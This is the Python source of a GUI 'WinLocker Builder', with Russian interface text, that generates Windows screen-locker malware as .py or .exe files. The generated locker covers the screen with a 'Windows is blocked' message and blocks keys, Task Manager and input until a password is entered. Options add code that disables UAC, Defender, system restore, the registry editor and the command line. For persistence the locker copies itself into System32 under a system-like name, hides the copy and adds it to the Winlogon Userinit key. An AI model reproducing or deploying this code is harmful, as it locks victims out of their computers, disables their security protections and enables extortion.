import customtkinter
from tkinter import filedialog, messagebox
import os
import shutil
import threading
import sys
import time

class BlockerSettings:
    def __init__(self, parent):
        self.parent = parent
        self.window = customtkinter.CTkToplevel()
        self.window.geometry('350x500')
        self.window.title('Настройки блокировок')
        self.window.resizable(False, False)
        
        # Заголовок
        self.title = customtkinter.CTkLabel(self.window, text="Настройки блокировок", font=("Arial", 16))
        self.title.pack(pady=5)
        
        # Фрейм для чекбоксов
        self.checks_frame = customtkinter.CTkScrollableFrame(self.window, width=300, height=400)
        self.checks_frame.pack(pady=5, padx=10, fill="both", expand=True)
        
        # Словарь для хранения состояний чекбоксов
        self.checkboxes = {}
        
        # Добавляем чекбоксы
        self.add_checkbox("disable_taskmgr", "Отключить диспетчер задач")
        self.add_checkbox("disable_regedit", "Отключить редактор реестра")
        self.add_checkbox("disable_cmd", "Отключить командную строку")
        self.add_checkbox("disable_powershell", "Отключить PowerShell")
        self.add_checkbox("disable_run", "Отключить выполнить (Win+R)")
        self.add_checkbox("disable_uac", "Отключить UAC")
        self.add_checkbox("disable_control_panel", "Отключить панель управления")
        self.add_checkbox("disable_context_menu", "Отключить контекстное меню")
        self.add_checkbox("disable_task_switching", "Отключить Alt+Tab")
        self.add_checkbox("disable_system_restore", "Отключить восстановление системы")
        self.add_checkbox("hide_tray_icons", "Скрыть иконки в трее")
        self.add_checkbox("disable_change_wallpaper", "Запретить смену обоев")
        self.add_checkbox("disable_network_connections", "Отключить сетевые подключения")
        self.add_checkbox("disable_task_bar", "Скрыть панель задач")
        self.add_checkbox("disable_start_menu", "Отключить меню Пуск")
        self.add_checkbox("disable_usb", "Отключить USB устройства")
        self.add_checkbox("disable_display_settings", "Отключить настройки экрана")
        self.add_checkbox("disable_mouse_keyboard", "Блокировать мышь и клавиатуру")
        self.add_checkbox("disable_alt_f4", "Отключить Alt+F4")
        self.add_checkbox("disable_windows_security", "Отключить Защитник Windows")
        self.add_checkbox("disable_system_settings", "Отключить настройки системы")
        self.add_checkbox("disable_explorer", "Отключить проводник")
        self.add_checkbox("disable_user_switching", "Отключить смену пользователя")
        self.add_checkbox("disable_lock", "Отключить блокировку (Win+L)")
        
        # Загружаем сохраненные настройки
        self.load_settings()
        
        # Сохраняем при закрытии окна
        self.window.protocol("WM_DELETE_WINDOW", self.on_closing)
        
    def add_checkbox(self, key, text):
        var = customtkinter.BooleanVar()
        checkbox = customtkinter.CTkCheckBox(self.checks_frame, text=text, variable=var)
        checkbox.pack(pady=2, padx=5, anchor="w")
        self.checkboxes[key] = var
        
    def get_settings(self):
        return {key: var.get() for key, var in self.checkboxes.items()}
        
    def load_settings(self):
        if hasattr(self.parent, 'saved_blocker_settings'):
            for key, value in self.parent.saved_blocker_settings.items():
                if key in self.checkboxes:
                    self.checkboxes[key].set(value)
                    
    def on_closing(self):
        self.parent.saved_blocker_settings = self.get_settings()
        self.window.destroy()

class WinLockerBuilder:
    def __init__(self):
        customtkinter.set_appearance_mode("dark")
        customtkinter.set_default_color_theme("blue")
        
        self.win = customtkinter.CTk()
        self.win.geometry('500x550')
        self.win.title('WinLocker Builder')
        self.win.resizable(False, False)
        
        self.icon_path = None
        self.saved_blocker_settings = {}

        # Основной контейнер
        self.main_frame = customtkinter.CTkFrame(self.win, fg_color="#2b2b2b")
        self.main_frame.pack(pady=10, padx=10, fill="both", expand=True)

        # Заголовок
        self.title_frame = customtkinter.CTkFrame(self.main_frame, fg_color="#232323", height=45)
        self.title_frame.pack(fill="x", padx=10, pady=5)
        self.title_frame.pack_propagate(False)
        
        self.title_label = customtkinter.CTkLabel(
            self.title_frame, 
            text="WinLocker Builder", 
            font=customtkinter.CTkFont(size=20, weight="bold")
        )
        self.title_label.pack(pady=8)

        # Контейнер для контента
        self.content_frame = customtkinter.CTkFrame(self.main_frame, fg_color="#232323")
        self.content_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Левая часть с заголовком
        self.left_section = customtkinter.CTkFrame(self.content_frame, fg_color="#232323")
        self.left_section.pack(side="left", fill="both", expand=True, padx=(10, 5))
        
        # Добавляем отступ перед заголовком
        customtkinter.CTkFrame(self.left_section, fg_color="#232323", height=10).pack(fill="x")
        
        self.left_header = customtkinter.CTkFrame(self.left_section, fg_color="#1b1b1b", height=35)
        self.left_header.pack(fill="x", pady=(0, 5))
        self.left_header.pack_propagate(False)
        
        self.left_title = customtkinter.CTkLabel(
            self.left_header, 
            text="Основные настройки", 
            font=("Arial", 12, "bold")
        )
        self.left_title.pack(pady=5)
        
        # Поле пароля
        self.password_label = customtkinter.CTkLabel(self.left_section, text="Пароль:")
        self.password_label.pack(pady=(10, 2), padx=10, anchor="w")
        
        self.password_entry = customtkinter.CTkEntry(self.left_section, show="*", width=200)
        self.password_entry.pack(pady=2, padx=10)

        # Поле сообщения
        self.message_label = customtkinter.CTkLabel(self.left_section, text="Сообщение:")
        self.message_label.pack(pady=(10, 2), padx=10, anchor="w")
        
        self.message_text = customtkinter.CTkTextbox(
            self.left_section, 
            height=100,
            width=200
        )
        self.message_text.pack(pady=(2, 15), padx=10)
        
        # Разделитель
        self.separator = customtkinter.CTkFrame(self.content_frame, width=2, fg_color="#3b3b3b")
        self.separator.pack(side="left", fill="y", pady=10)
        
        # Правая часть с заголовком
        self.right_section = customtkinter.CTkFrame(self.content_frame, fg_color="#232323")
        self.right_section.pack(side="right", fill="both", expand=True, padx=(5, 10))
        
        # Добавляем отступ перед заголовком
        customtkinter.CTkFrame(self.right_section, fg_color="#232323", height=10).pack(fill="x")
        
        self.right_header = customtkinter.CTkFrame(self.right_section, fg_color="#1b1b1b", height=35)
        self.right_header.pack(fill="x", pady=(0, 5))
        self.right_header.pack_propagate(False)
        
        self.right_title = customtkinter.CTkLabel(
            self.right_header, 
            text="Дополнительно", 
            font=("Arial", 12, "bold")
        )
        self.right_title.pack(pady=5)

        # Кнопки настроек
        self.blocker_settings_btn = customtkinter.CTkButton(
            self.right_section,
            text="Настройки блокировок",
            command=self.open_blocker_settings,
            width=180,
            height=32
        )
        self.blocker_settings_btn.pack(pady=(15, 5))

        self.icon_button = customtkinter.CTkButton(
            self.right_section,
            text="Выбрать иконку",
            command=self.select_icon,
            width=180,
            height=32
        )
        self.icon_button.pack(pady=5)

        self.autorun = customtkinter.CTkCheckBox(
            self.right_section, 
            text="Добавить в автозагрузку",
            width=180,
        )
        self.autorun.pack(pady=5)

        # Кнопки создания
        self.build_frame = customtkinter.CTkFrame(self.main_frame, fg_color="#232323", height=50)
        self.build_frame.pack(pady=5, padx=10, fill="x")
        self.build_frame.pack_propagate(False)

        self.build_py_button = customtkinter.CTkButton(
            self.build_frame,
            text="Создать .py",
            command=lambda: self.build_locker(is_exe=False),
            width=110,
            height=32
        )
        self.build_py_button.pack(side="left", padx=30, pady=8)

        self.build_exe_button = customtkinter.CTkButton(
            self.build_frame,
            text="Создать .exe",
            command=lambda: self.build_locker(is_exe=True),
            width=110,
            height=32
        )
        self.build_exe_button.pack(side="right", padx=30, pady=8)

        # Консоль
        self.console_frame = customtkinter.CTkFrame(self.win, fg_color="#232323")
        self.console_frame.pack(pady=5, padx=10, fill="x")
        
        self.console = customtkinter.CTkTextbox(
            self.console_frame, 
            height=120,
            width=480,
            font=("Consolas", 11)
        )
        self.console.pack(pady=5, padx=5)
        self.console.configure(state="disabled")
        
        # Статус бар
        self.status_label = customtkinter.CTkLabel(
            self.win,
            text="Готов к работе",
            font=customtkinter.CTkFont(size=11)
        )
        self.status_label.pack(pady=2)

    def open_blocker_settings(self):
        self.blocker_settings = BlockerSettings(self)
        
    def select_icon(self):
        icon_path = filedialog.askopenfilename(
            title="Выберите иконку",
            filetypes=[("Icon files", "*.ico")]
        )
        if icon_path:
            self.icon_path = icon_path
            self.icon_button.configure(text="Иконка выбрана ✓")

    def show_error(self, error_msg):
        messagebox.showerror("Ошибка", error_msg)
        self.status_label.configure(text="Готов к работе")
        self.build_py_button.configure(state="normal")
        self.build_exe_button.configure(state="normal")

    def show_success(self):
        messagebox.showinfo("Успех", "Файл успешно создан!")
        self.status_label.configure(text="Готов к работе")
        self.build_py_button.configure(state="normal")
        self.build_exe_button.configure(state="normal")

    def create_exe_thread(self, temp_py_path, save_path):
        try:
            import subprocess
            self.status_label.configure(text="Создание EXE файла...")
            self.log_to_console("[*] Начало создания EXE файла...")
            self.log_to_console("[*] Это может занять 1-2 минуты...")
            
            current_dir = os.path.dirname(os.path.abspath(__file__))
            temp_dist_dir = os.path.join(current_dir, "dist_temp")
            temp_build_dir = os.path.join(current_dir, "build_temp")
            
            self.log_to_console("[*] Создание временных директорий...")
            os.makedirs(temp_dist_dir, exist_ok=True)
            os.makedirs(temp_build_dir, exist_ok=True)
            
            output_name = os.path.splitext(os.path.basename(save_path))[0]
            
            cmd = [
                'pyinstaller',
                '--onefile',
                '--windowed',
                f'--distpath={temp_dist_dir}',
                f'--workpath={temp_build_dir}',
                f'--specpath={temp_build_dir}',
                f'--name={output_name}',
            ]
            
            if self.icon_path:
                cmd.append(f'--icon={self.icon_path}')
                self.log_to_console("[*] Добавление пользовательской иконки...")
            
            cmd.append(temp_py_path)
            
            self.log_to_console("[*] Запуск PyInstaller...")
            self.log_to_console("[*] Сборка EXE файла...")
            
            # Запускаем процесс и получаем вывод
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )

            # Читаем вывод в реальном времени
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    output = output.strip()
                    # Фильтруем и форматируем вывод
                    if "INFO: " in output:
                        if "PyInstaller" in output:
                            self.log_to_console("[*] Инициализация PyInstaller...")
                        elif "Building" in output:
                            self.log_to_console("[*] Сборка файла...")
                        elif "Copying" in output:
                            self.log_to_console("[*] Копирование необходимых файлов...")
                        elif "Appending" in output:
                            self.log_to_console("[*] Добавление ресурсов...")
                        elif "Fixing" in output:
                            self.log_to_console("[*] Финальные настройки...")
                    elif "WARNING: " in output:
                        self.log_to_console("[!] " + output.split("WARNING: ")[1])
                    elif "ERROR: " in output:
                        self.log_to_console("[-] " + output.split("ERROR: ")[1])

            process.wait()
            
            temp_exe = os.path.join(temp_dist_dir, f"{output_name}.exe")
            
            if os.path.exists(temp_exe):
                self.log_to_console("[*] Перемещение готового файла...")
                shutil.move(temp_exe, save_path)
                
            if os.path.exists(save_path):
                self.log_to_console("[+] Файл успешно создан!")
                self.win.after(0, lambda: self.status_label.configure(text="Готово!"))
                self.win.after(0, self.show_success)
            else:
                raise Exception("Файл не был создан в указанном месте")
                
        except Exception as e:
            error_msg = str(e)
            def show_error_message(msg=error_msg):
                self.log_to_console(f"[-] Ошибка: {msg}")
                self.show_error(f"Ошибка при создании файла: {msg}")
            self.win.after(0, show_error_message)

        finally:
            # Очистка временных файлов
            try:
                if os.path.exists(temp_dist_dir):
                    shutil.rmtree(temp_dist_dir)
                if os.path.exists(temp_build_dir):
                    shutil.rmtree(temp_build_dir)
            except Exception:
                pass

    def build_locker(self, is_exe=False):
        if not self.password_entry.get():
            messagebox.showerror("Ошибка", "Введите пароль для разблокировки!")
            return
        
        extension = ".exe" if is_exe else ".py"
        filetypes = [("Executable files", "*.exe")] if is_exe else [("Python files", "*.py")]
        
        save_path = filedialog.asksaveasfilename(
            defaultextension=extension,
            filetypes=filetypes
        )
        
        if save_path:
            # Отключаем кнопки на время создания
            self.build_py_button.configure(state="disabled")
            self.build_exe_button.configure(state="disabled")
            self.status_label.configure(text="Создание файла...")
            
            # Запускаем создание в отдельном потоке
            thread = threading.Thread(
                target=self._build_in_thread,
                args=(save_path, is_exe)
            )
            thread.daemon = True
            thread.start()

    def _build_in_thread(self, save_path, is_exe):
        try:
            # Читаем базовый код winlocker.py
            with open('winlocker.py', 'r', encoding='utf-8') as f:
                lines = f.readlines()

            # Находим строку с 'pass' и заменяем её на наш код
            for i, line in enumerate(lines):
                if 'pass # код который выполняется если запущен как администратор' in line:
                    # Подготавливаем дополнительные функции
                    additional_functions = []
                    additional_calls = []

                    # Проверяем тип пароля
                    try:
                        int(self.password_entry.get())
                        password_check_code = "int(entry_pas.get())"
                    except ValueError:
                        password_check_code = "entry_pas.get()"

                    # Добавляем автозагрузку если выбрано
                    if self.autorun.get():
                        additional_functions.append('''
        try:
            import winreg
            import sys
            import os
            import shutil
            import subprocess
            
            # Путь к System32
            system32_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            
            # Создаем скрытую директорию в System32
            hidden_dir = os.path.join(system32_dir, "WinServices")  # Маскируемся под системную папку
            os.makedirs(hidden_dir, exist_ok=True)
            
            # Копируем файл
            current_file = os.path.abspath(sys.argv[0])
            hidden_name = "WinSystemService.exe"  # Маскируемся под системный процесс
            hidden_path = os.path.join(hidden_dir, hidden_name)
            
            # Копируем файл
            shutil.copy2(current_file, hidden_path)
            
            # Скрываем директорию и файл
            subprocess.run(['attrib', '+h', '+s', '+r', hidden_dir], capture_output=True)
            subprocess.run(['attrib', '+h', '+s', '+r', hidden_path], capture_output=True)
            
            # Добавляем путь в userinit
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, winreg.KEY_ALL_ACCESS)
            current_userinit = winreg.QueryValueEx(key, "Userinit")[0]
            if hidden_path not in current_userinit:
                new_userinit = current_userinit + "," + hidden_path
                winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, new_userinit)
            key.Close()
        except Exception as e:
            print(f"Ошибка при добавлении в автозагрузку: {e}")
            pass''')

                    # Добавляем блокировки из сохраненных настроек
                    if hasattr(self, 'saved_blocker_settings'):
                        for key, value in self.saved_blocker_settings.items():
                            if value:
                                if key == "disable_taskmgr":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_regedit":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_cmd":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Policies\\Microsoft\\Windows\\System")
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_powershell":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Policies\\Microsoft\\Windows\\PowerShell")
            winreg.SetValueEx(key, "EnableScripts", 0, winreg.REG_DWORD, 0)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_run":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_uac":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_control_panel":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_context_menu":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoViewContextMenu", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_task_switching":
                                    additional_functions.append('''
        try:
            keyboard.block_key('alt+tab')
        except Exception:
            pass''')
                                
                                elif key == "disable_system_restore":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore")
            winreg.SetValueEx(key, "DisableSR", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "hide_tray_icons":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoTrayItemsDisplay", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_change_wallpaper":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoChangingWallPaper", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_network_connections":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoNetworkConnections", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_task_bar":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoTaskBar", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_start_menu":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoStartMenuPinnedList", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoStartMenu", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_usb":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\USBSTOR")
            winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_display_settings":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "NoDispSettingsPage", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_mouse_keyboard":
                                    additional_functions.append('''
        try:
            import ctypes
            ctypes.windll.user32.BlockInput(True)
        except Exception:
            pass''')
                                
                                elif key == "disable_alt_f4":
                                    additional_functions.append('''
        try:
            keyboard.block_key('alt+f4')
        except Exception:
            pass''')
                                
                                elif key == "disable_windows_security":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Policies\\Microsoft\\Windows Defender")
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
            key.Close()
            
            # Отключаем службу Windows Defender
            import os
            os.system('net stop "Windows Defender Antivirus Service" /y')
            os.system('net stop "Windows Defender Firewall" /y')
        except Exception:
            pass''')
                                
                                elif key == "disable_regedit":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_cmd":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Policies\\Microsoft\\Windows\\System")
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_powershell":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Policies\\Microsoft\\Windows\\PowerShell")
            winreg.SetValueEx(key, "EnableScripts", 0, winreg.REG_DWORD, 0)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_run":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_uac":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_control_panel":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_context_menu":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoViewContextMenu", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_system_restore":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore")
            winreg.SetValueEx(key, "DisableSR", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "hide_tray_icons":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoTrayItemsDisplay", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_change_wallpaper":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoChangingWallPaper", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_network_connections":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoNetworkConnections", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_usb":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\USBSTOR")
            winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_display_settings":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "NoDispSettingsPage", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_system_settings":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_user_switching":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "HideFastUserSwitching", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')
                                
                                elif key == "disable_lock":
                                    additional_functions.append('''
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
            key.Close()
        except Exception:
            pass''')

                    # Формируем код винлокера
                    locker_code = f'''        import tkinter as tk
        import screeninfo
        import keyboard
        import random
        import string
        import threading
        import time
        import os
        import subprocess
        
        label_text_1 = "WINDOWS ЗАБЛОКИРОВАН!"
        label_text_2 = """{self.message_text.get("1.0", "end-1c")}"""
        password = {self.password_entry.get()}
        chars = string.ascii_letters + string.digits

        def random_title(length=20):
            return ''.join(random.choices(chars, k=length))

        def block_keys():
            keys_to_block = ['alt', 'tab', 'd', 'win', 'esc', 'ctrl', 'shift', 'del', 'space']
            for key in keys_to_block:
                keyboard.block_key(key)

        def check_password():
            try:
                entered_password = {password_check_code}
                if entered_password == password:
                    root.destroy()
            except ValueError:
                pass

        def block_subprocess():
            subprocess.run(["taskkill", "/F", "/IM", "Taskmgr.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            time.sleep(0.1)

        {chr(10).join(additional_functions)}

        block_keys()
        {chr(10).join(additional_calls)}
        threading.Thread(target=block_subprocess).start()

        root = tk.Tk()

        screen = screeninfo.get_monitors()[0]
        root.geometry(f"{{screen.width}}x{{screen.height}}+0+0")
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.config(bg='black')
        root.protocol('WM_DELETE_WINDOW', lambda: None)
        root.title(random_title())

        label_1 = tk.Label(root, text=label_text_1, fg='RED', bg='black', font=('Arial', 40))
        label_1.place(relx=0.5, rely=0.1, anchor=tk.CENTER)

        label_2 = tk.Label(root, text=label_text_2, fg='white', bg='black', font=('Arial', 20))
        label_2.place(relx=0.5, rely=0.25, anchor=tk.CENTER)

        entry_pas = tk.Entry(root, width=30, font=20)
        entry_pas.place(relx=0.5, rely=0.8, anchor=tk.CENTER)

        button = tk.Button(root, command=check_password, text='OK', width=5, height=1)
        button.place(relx=0.6, rely=0.8, anchor=tk.CENTER)

        root.mainloop()'''

                    lines[i] = locker_code + '\n'
                    break

            # Сохраняем измененный файл
            with open(save_path, 'w', encoding='utf-8') as f:
                f.writelines(lines)

            # После успешного создания
            if is_exe:
                self.create_exe_thread(save_path, save_path)
            else:
                self.win.after(0, self.show_success)
                
        except Exception as e:
            self.win.after(0, lambda: self.show_error(f"Ошибка при создании файла: {str(e)}"))

    def run(self):
        self.win.mainloop()

    def log_to_console(self, message):
        """Добавляет сообщение в консоль"""
        self.console.configure(state="normal")
        self.console.insert("end", message + "\n")
        self.console.see("end")  # Прокрутка к последней строке
        self.console.configure(state="disabled")
        
        # Обновляем GUI
        self.win.update_idletasks()

if __name__ == "__main__":
    app = WinLockerBuilder()
    app.run()